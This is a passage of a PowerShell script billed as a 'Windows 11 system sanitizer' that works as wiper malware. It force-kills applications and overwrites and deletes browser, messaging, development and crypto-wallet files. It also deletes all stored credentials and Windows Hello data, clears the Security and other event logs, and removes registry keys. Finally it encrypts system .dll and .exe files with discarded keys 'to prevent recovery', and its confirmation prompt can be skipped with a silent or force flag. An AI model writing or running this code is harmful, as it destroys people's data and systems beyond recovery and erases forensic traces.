        } catch {
            Write-SystemOutput "⚠ Privilege not available: $privilege" 'Yellow' 'PRIVILEGE'
        }
    }
}

# ========================================
# SAFE PROCESS KILLER (NO EXPLORER.EXE)
# ========================================

function Kill-SafeBlockingProcesses {
    <#
    .SYNOPSIS
    Safely kills user applications without breaking system
    #>
    
    Write-SystemOutput "Safely terminating user applications..." 'Yellow' 'PROCESS'
    
    foreach ($pattern in $Global:Config.KillableProcesses) {
        try {
            $processes = Get-Process -Name "*$pattern*" -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                try {
                    $process | Stop-Process -Force -ErrorAction Stop
                    Write-SystemOutput "✓ Terminated process: $($process.ProcessName) (PID: $($process.Id))" 'Green' 'PROCESS'
                } catch {
                    Write-SystemOutput "⚠ Could not terminate: $($process.ProcessName)" 'Yellow' 'PROCESS'
                }
            }
        } catch {
            # Continue if pattern fails
        }
    }
    
    Start-Sleep -Seconds 2
    Write-SystemOutput "Safe process termination complete" 'Cyan' 'PROCESS'
}

# ========================================
# ENHANCED CRYPTOGRAPHIC ENGINE
# ========================================

function New-SecureRandomKey {
    <#
    .SYNOPSIS
    Generates cryptographically secure random keys
    #>
    
    $key = New-Object byte[] 32
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($key)
    $rng.Dispose()
    return $key
}

function Secure-Delete-File {
    <#
    .SYNOPSIS
    Enhanced secure file deletion with military-grade encryption
    #>
    
    param(
        [string]$FilePath,
        [int]$Rounds = 7,
        [bool]$NuclearMode = $false
    )
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        $fileSize = $fileInfo.Length
        
        if ($fileSize -eq 0) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
            return $true
        }
        
        # Adaptive rounds based on file size and nuclear mode
        $actualRounds = if ($NuclearMode) { 
            $Global:Config.NuclearModeRounds 
        } elseif ($fileSize -gt 100MB) { 
            [Math]::Max(3, [Math]::Floor($Rounds / 2)) 
        } else { 
            $Rounds 
        }
        
        Write-SystemOutput "Processing: $($fileInfo.Name) ($([math]::Round($fileSize/1MB, 2))MB) - $actualRounds rounds" 'Cyan' 'ENCRYPT'
        
        for ($round = 1; $round -le $actualRounds; $round++) {
            $key = New-SecureRandomKey
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.KeySize = 256
            $aes.Key = $key
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            
            $encryptor = $aes.CreateEncryptor()
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
            $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            
            # Fast encryption with streaming
            $buffer = New-Object byte[] $Global:Config.BufferSize
            $position = 0
            
            while ($position -lt $fileSize) {
                $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
                $rng.GetBytes($buffer)
                $rng.Dispose()
                
                $read = [Math]::Min($buffer.Length, $fileSize - $position)
                $cryptoStream.Write($buffer, 0, $read)
                $position += $read
                
                if (-not $Silent -and ($round -eq 1) -and ($position % (10MB) -eq 0)) {
                    $progress = [Math]::Round(($position / $fileSize) * 100, 1)
                    Write-Progress -Activity "Encrypting $round/$actualRounds" -Status $FilePath -PercentComplete $progress
                }
            }
            
            $cryptoStream.FlushFinalBlock()
            $cryptoStream.Dispose()
            $fileStream.SetLength(0)  # Truncate to zero
            $fileStream.Dispose()
            
            # Clear key from memory
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        
        # Multi-pass random overwrite
        for ($i = 1; $i -le 3; $i++) {
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            $randomData = New-Object byte[] $fileSize
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            $rng.GetBytes($randomData)
            $rng.Dispose()
            $fileStream.Write($randomData, 0, $randomData.Length)
            $fileStream.Dispose()
        }
        
        # Final zero pass
        $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $zeroData = New-Object byte[] $fileSize
        $fileStream.Write($zeroData, 0, $zeroData.Length)
        $fileStream.Dispose()
        
        # Final deletion
        Remove-Item $FilePath -Force -ErrorAction Stop
        return $true
        
    } catch {
        Write-SystemOutput "ERROR: Failed to delete $FilePath - $($_.Exception.Message)" 'Red' 'ERROR'
        return $false
    } finally {
        Write-Progress -Activity "Secure Deletion" -Completed
    }
}

function Secure-Encrypt-SystemFile {
    <#
    .SYNOPSIS
    Encrypts system files that cannot be deleted
    #>
    
    param(
        [string]$FilePath,
        [int]$Rounds = 10
    )
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        $fileSize = $fileInfo.Length
        
        if ($fileSize -eq 0) {
            return $true
        }
        
        Write-SystemOutput "Encrypting system file: $($fileInfo.Name) ($([math]::Round($fileSize/1MB, 2))MB)" 'Yellow' 'SYSTEM'
        
        for ($round = 1; $round -le $Rounds; $round++) {
            $key = New-SecureRandomKey
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.KeySize = 256
            $aes.Key = $key
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            
            $encryptor = $aes.CreateEncryptor()
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
            $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            
            # Encrypt with random data
            $buffer = New-Object byte[] $Global:Config.BufferSize
            $position = 0
            
            while ($position -lt $fileSize) {
                $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
                $rng.GetBytes($buffer)
                $rng.Dispose()
                
                $read = [Math]::Min($buffer.Length, $fileSize - $position)
                $cryptoStream.Write($buffer, 0, $read)
                $position += $read
            }
            
            $cryptoStream.FlushFinalBlock()
            $cryptoStream.Dispose()
            $fileStream.Dispose()
            
            # Clear key from memory
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        
        return $true
        
    } catch {
        Write-SystemOutput "ERROR: Failed to encrypt system file $FilePath - $($_.Exception.Message)" 'Red' 'ERROR'
        return $false
    }
}

# ========================================
# COMPREHENSIVE SYSTEM SCANNER
# ========================================

function Find-AllSystemTargets {
    <#
    .SYNOPSIS
    Comprehensive system target discovery
    #>
    
    Write-SystemOutput "Initiating comprehensive system target discovery..." 'Cyan' 'SCAN'
    
    $allTargets = @()
    $foundFiles = 0
    
    # Function to scan paths with patterns
    $scanCategory = {
        param($Paths, $Name)
        $categoryTargets = @()
        
        foreach ($pattern in $Paths) {
            try {
                $files = Get-ChildItem -Path $pattern -Recurse -ErrorAction SilentlyContinue | Where-Object { 
                    $_.PSObject.Properties['Name'] -and $_.Length -gt 0 -and $_.FullName -notmatch "System32|System Volume Information"
                }
                $categoryTargets += $files
            } catch {
                # Continue if pattern fails
            }
        }
        
        return @{
            Category = $Name
            Files = $categoryTargets
        }
    }
    
    # Browser targets
    foreach ($browserType in $Global:Config.BrowserTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.BrowserTargets[$browserType] -Name "Browser-$browserType"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-SystemOutput "✓ Found $($result.Files.Count) $browserType files" 'Green' 'SCAN'
    }
    
    # Gaming targets
    $result = & $scanCategory -Paths $Global:Config.GamingTargets -Name "Gaming"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) gaming files" 'Green' 'SCAN'
    
    # Communication targets
    $result = & $scanCategory -Paths $Global:Config.CommunicationTargets -Name "Communication"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) communication files" 'Green' 'SCAN'
    
    # Streaming targets
    $result = & $scanCategory -Paths $Global:Config.StreamingTargets -Name "Streaming"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) streaming files" 'Green' 'SCAN'
    
    # Development targets
    $result = & $scanCategory -Paths $Global:Config.DevTargets -Name "Development"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) development files" 'Green' 'SCAN'
    
    # Crypto targets
    $result = & $scanCategory -Paths $Global:Config.CryptoTargets -Name "Cryptocurrency"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) crypto files" 'Green' 'SCAN'
    
    # System targets
    foreach ($systemType in $Global:Config.SystemTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.SystemTargets[$systemType] -Name "System-$systemType"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-SystemOutput "✓ Found $($result.Files.Count) $systemType files" 'Green' 'SCAN'
    }
    
    # Remove duplicates and get unique targets
    $uniqueTargets = $allTargets | Sort-Object -Property FullName -Unique
    
    Write-SystemOutput "Scan complete: $($uniqueTargets.Count) unique targets discovered" 'Cyan' 'SCAN'
    return $uniqueTargets
}

# ========================================
# COMPREHENSIVE SYSTEM CLEANUP
# ========================================

function Clear-WindowsSystemData {
    <#
    .SYNOPSIS
    Comprehensive Windows system data cleanup
    #>
    
    Write-SystemOutput "Executing comprehensive Windows system cleanup..." 'Cyan' 'SYSTEM'
    
    # Windows Credential Manager
    try {
        Write-SystemOutput "Clearing Windows Credential Manager..." 'Yellow' 'SYSTEM'
        & cmdkey.exe /list 2>$null | Where-Object { $_ -match "Target:" } | ForEach-Object {
            $target = ($_ -split "Target:")[1].Trim()
            & cmdkey.exe /delete:$target 2>$null
        }
        Write-SystemOutput "✓ Windows Credential Manager cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Credential Manager cleanup partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Windows Hello biometric data
    try {
        Write-SystemOutput "Clearing Windows Hello biometric data..." 'Yellow' 'SYSTEM'
        foreach ($path in $Global:Config.SystemTargets.WindowsHello) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        Write-SystemOutput "✓ Windows Hello biometric data cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Windows Hello cleanup partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Event logs
    try {
        Write-SystemOutput "Clearing Windows event logs..." 'Yellow' 'SYSTEM'
        $eventLogs = @("Application", "Security", "System", "Setup", "ForwardedEvents")
        foreach ($log in $eventLogs) {
            & wevtutil.exe cl $log 2>$null
        }
        Write-SystemOutput "✓ Event logs cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Event log clearing partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Recent files and MRU
    try {
        Write-SystemOutput "Clearing recent files and MRU entries..." 'Yellow' 'SYSTEM'
        $registryPaths = @(
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
            "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs"
        )
        foreach ($regPath in $registryPaths) {
            if (Test-Path $regPath) {
                Clear-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
            }
        }
        Write-SystemOutput "✓ Recent files and MRU cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Recent files cleanup partially failed" 'Yellow' 'SYSTEM'
    }
}

function Clear-RegistrySystemData {
    <#
    .SYNOPSIS
    Comprehensive registry-based data cleanup
    #>
    
    Write-SystemOutput "Executing comprehensive registry cleanup..." 'Cyan' 'REGISTRY'
    
    foreach ($regPath in $Global:Config.RegistryTargets) {
        try {
            if (Test-Path $regPath) {
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
                Write-SystemOutput "✓ Cleared registry: $regPath" 'Green' 'REGISTRY'
            }
        } catch {
            Write-SystemOutput "⚠ Could not clear registry: $regPath" 'Yellow' 'REGISTRY'
        }
    }
}

function Clear-NetworkSystemData {
    <#
    .SYNOPSIS
    Comprehensive network trace and cache cleanup
    #>
    
    Write-SystemOutput "Clearing network traces and system caches..." 'Cyan' 'NETWORK'
    
    # DNS cache
    try {
        & ipconfig.exe /flushdns 2>$null
        Write-SystemOutput "✓ DNS cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear DNS cache" 'Yellow' 'NETWORK'
    }
    
    # ARP cache
    try {
        & arp.exe -a | Where-Object { $_ -notmatch "^Interface:" } | ForEach-Object {
            $ip = ($_ -split "\s+")[0]
            & arp.exe -d $ip 2>$null
        }
        Write-SystemOutput "✓ ARP cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear ARP cache" 'Yellow' 'NETWORK'
    }
    
    # WINS cache
    try {
        & nbtstat.exe -RR 2>$null
        Write-SystemOutput "✓ WINS cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear WINS cache" 'Yellow' 'NETWORK'
    }
}

function Wipe-SystemMemory {
    <#
    .SYNOPSIS
    System memory and page file wiping
    #>
    
    Write-SystemOutput "Wiping system memory traces..." 'Cyan' 'MEMORY'
    
    # Enable page file clearing on shutdown
    try {
        $pagefilePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
        if (Test-Path $pagefilePath) {
            Set-ItemProperty -Path $pagefilePath -Name "ClearPageFileAtShutdown" -Value 1 -Force -ErrorAction SilentlyContinue
            Write-SystemOutput "✓ Page file clearing enabled" 'Green' 'MEMORY'
        }
    } catch {
        Write-SystemOutput "⚠ Could not enable page file clearing" 'Yellow' 'MEMORY'
    }
    
    # Force aggressive garbage collection
    1..5 | ForEach-Object { 
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        Start-Sleep -Milliseconds 100
    }
    Write-SystemOutput "✓ Aggressive memory garbage collection performed" 'Green' 'MEMORY'
}

# ========================================
# SYSTEM FILE ENCRYPTION
# ========================================

function Encrypt-SystemFiles {
    <#
    .SYNOPSIS
    Encrypts critical system files to prevent recovery
    #>
    
    Write-SystemOutput "Encrypting critical system files..." 'Cyan' 'SYSTEM'
    
    foreach ($pattern in $Global:Config.SystemFilesForEncryption) {
        try {
            $files = Get-ChildItem -Path $pattern -Recurse -ErrorAction SilentlyContinue | Where-Object {
                $_.PSObject.Properties['Name'] -and $_.Length -gt 0 -and $_.Extension -match "\.dll|\.exe|\.dat|\.bin"
            }
            
            foreach ($file in $files) {
                Secure-Encrypt-SystemFile $file.FullName 10
            }
            Write-SystemOutput "✓ Encrypted system files matching: $pattern" 'Green' 'SYSTEM'
        } catch {
            Write-SystemOutput "⚠ Could not process system files: $pattern" 'Yellow' 'SYSTEM'
        }
    }
}

# ========================================
# COMPREHENSIVE WIPING ENGINE
# ========================================

function Start-ComprehensiveSystemWipe {
    <#
    .SYNOPSIS
    Main comprehensive system wiping function
    #>
    
    # Display professional banner
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
    Write-SystemOutput "    COMPREHENSIVE WINDOWS 11 SYSTEM SANITIZER" 'Cyan' 'SYSTEM'
    Write-SystemOutput "    Professional Data Erasure with System Protection" 'Cyan' 'SYSTEM'
    Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
    Write-SystemOutput ""
    Write-SystemOutput "WARNING: This will PERMANENTLY delete ALL credentials, passwords," 'Red' 'WARNING'
    Write-SystemOutput "and sensitive data on this system!" 'Red' 'WARNING'
    Write-SystemOutput "Ensure you have backups and understand the consequences." 'Yellow' 'WARNING'
    Write-SystemOutput ""
    
    # Configuration summary
    $configSummary = @"
CONFIGURATION:
• Encryption Rounds: $EncryptionRounds $(if($NuclearMode){"(NUCLEAR MODE: 10 rounds)"}else{""})
• Nuclear Mode: $($NuclearMode.IsPresent)
• Deep Scan: $($DeepScan.IsPresent)
• Verification: $($Verify.IsPresent)
• System Coverage: COMPREHENSIVE WITH PROTECTION
• Safe Process Termination: ENABLED
"@
    Write-SystemOutput $configSummary 'White' 'INFO'
    
    # User confirmation
    if (-not $Force -and -not $Silent) {
        Write-SystemOutput "" 'White' 'INFO'
        $response = Read-Host "Type 'SANITIZE' to proceed with complete system sanitization"
        if ($response -ne 'SANITIZE') {
            Write-SystemOutput "Operation cancelled." 'Yellow' 'INFO'
            return
        }
    }
    
    # Initialize system access safely
    Initialize-SystemAccess
    
    # Kill blocking processes SAFELY
    Kill-SafeBlockingProcesses
    
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "INITIATING COMPREHENSIVE SYSTEM SANITIZATION..." 'Cyan' 'WIPE'
    
    # Start timing
    $startTime = Get-Date
    
    # Discover all system targets
    $targets = Find-AllSystemTargets
    $totalFiles = $targets.Count
    
    if ($totalFiles -eq 0) {
        Write-SystemOutput "No target files found. System may already be clean." 'Yellow' 'WARNING'
    } else {
        Write-SystemOutput "Discovered $totalFiles target files for secure deletion.`n" 'Green' 'INFO'
        
        # Process files with parallel execution
        $successfulDeletions = 0
        $failedDeletions = 0
        $totalBytesProcessed = 0
        
        $batchSize = [Math]::Max(1, [Math]::Floor($totalFiles / $Global:Config.MaxParallelJobs))
        
        for ($i = 0; $i -lt $totalFiles; $i += $batchSize) {
            $batch = $targets | Select-Object -Skip $i -First $batchSize
            
            foreach ($file in $batch) {
                try {
                    if (Secure-Delete-File $file.FullName $EncryptionRounds $NuclearMode) {
                        $successfulDeletions++
                        $totalBytesProcessed += $file.Length
                        if (-not $Silent) {
                            Write-SystemOutput "✓ Deleted: $($file.Name)" 'Green' 'DELETE'
                        }
                    } else {
                        $failedDeletions++
                        Write-SystemOutput "✗ Failed: $($file.Name)" 'Red' 'ERROR'
                    }
                } catch {
                    $failedDeletions++
                    Write-SystemOutput "✗ Error: $($file.Name) - $($_.Exception.Message)" 'Red' 'ERROR'
                }
            }
        }
    }
    
    # Comprehensive system cleanup
    Write-SystemOutput "`nEXECUTING COMPREHENSIVE SYSTEM CLEANUP..." 'Cyan' 'CLEANUP'
    
    # Windows system data cleanup
    Clear-WindowsSystemData
    
    # Registry cleanup
    Clear-RegistrySystemData
    
    # Network data cleanup
    Clear-NetworkSystemData
    
    # Memory wiping
    Wipe-SystemMemory
    
    # System file encryption (new feature)
    Encrypt-SystemFiles
    
    # Final verification
    if ($Verify) {
        Write-SystemOutput "`nPERFORMING FINAL VERIFICATION..." 'Yellow' 'VERIFY'
        $remainingTargets = Find-AllSystemTargets
        if ($remainingTargets.Count -eq 0) {
            Write-SystemOutput "VERIFICATION PASSED: No sensitive data remaining" 'Green' 'VERIFY'
        } else {
            Write-SystemOutput "VERIFICATION FAILED: $($remainingTargets.Count) files still exist" 'Red' 'ERROR'
        }
    }
    
    # Calculate final statistics
    $endTime = Get-Date
    $duration = $endTime - $startTime
    $durationMinutes = [Math]::Round($duration.TotalMinutes, 2)
    
    # Final comprehensive report
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
    Write-SystemOutput "         SYSTEM SANITIZATION COMPLETE" 'Cyan' 'FINAL'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
    Write-SystemOutput ""
    Write-SystemOutput "FINAL REPORT:" 'White' 'FINAL'
    Write-SystemOutput "• Files processed: $totalFiles" 'White' 'FINAL'
    Write-SystemOutput "• Successful deletions: $successfulDeletions" 'Green' 'FINAL'
    Write-SystemOutput "• Failed deletions: $failedDeletions" 'Red' 'FINAL'
    Write-SystemOutput "• Data processed: $([math]::Round($totalBytesProcessed/1MB, 2)) MB" 'White' 'FINAL'
    Write-SystemOutput "• Total execution time: $durationMinutes minutes" 'White' 'FINAL'
    Write-SystemOutput "• Encryption rounds: $EncryptionRounds" 'White' 'FINAL'
    Write-SystemOutput "• Nuclear mode: $($NuclearMode.IsPresent)" 'White' 'FINAL'
    Write-SystemOutput "• System protection: ENABLED" 'White' 'FINAL'
    Write-SystemOutput ""
    
    if ($failedDeletions -eq 0) {
        Write-SystemOutput "MISSION ACCOMPLISHED!" 'Green' 'FINAL'
        Write-SystemOutput "All credentials, passwords, and sensitive data have been" 'Green' 'FINAL'
        Write-SystemOutput "permanently destroyed using military-grade encryption." 'Green' 'FINAL'
        Write-SystemOutput "System files have been encrypted to prevent recovery." 'Green' 'FINAL'
    } else {
        Write-SystemOutput "MISSION COMPLETED WITH WARNINGS" 'Yellow' 'FINAL'
        Write-SystemOutput "Some files could not be deleted. Review logs above." 'Yellow' 'FINAL'
    }
    
    Write-SystemOutput "" 'White' 'FINAL'
    Write-SystemOutput "SECURITY RECOMMENDATIONS:" 'Yellow' 'FINAL'
    Write-SystemOutput "1. Restart the system to clear any remaining memory data" 'Yellow' 'FINAL'
    Write-SystemOutput "2. Perform a clean Windows 11 reinstall for maximum security" 'Yellow' 'FINAL'
    Write-SystemOutput "3. Change all passwords for accounts that may have been compromised" 'Yellow' 'FINAL'
    Write-SystemOutput "4. Review and update all security configurations" 'Yellow' 'FINAL'
    Write-SystemOutput "5. Monitor system for any unusual activity post-sanitization" 'Yellow' 'FINAL'
    
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "System sanitization operation completed successfully." 'Cyan' 'FINAL'
    Write-SystemOutput "All applications should now be non-functional due to data destruction." 'Cyan' 'FINAL'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
}

# ========================================
# MAIN EXECUTION
# ========================================

# Main execution with comprehensive error handling
try {
    Start-ComprehensiveSystemWipe
} catch {
    Write-SystemOutput "`nCRITICAL ERROR OCCURRED:" 'Red' 'ERROR'
    Write-SystemOutput "Message: $($_.Exception.Message)" 'Red' 'ERROR'
    Write-SystemOutput "The system sanitization process may have been incomplete." 'Yellow' 'ERROR'
    Write-SystemOutput "Review the error and consider re-running with appropriate privileges." 'Yellow' 'ERROR'
    exit 1
}

# End of comprehensive system sanitizer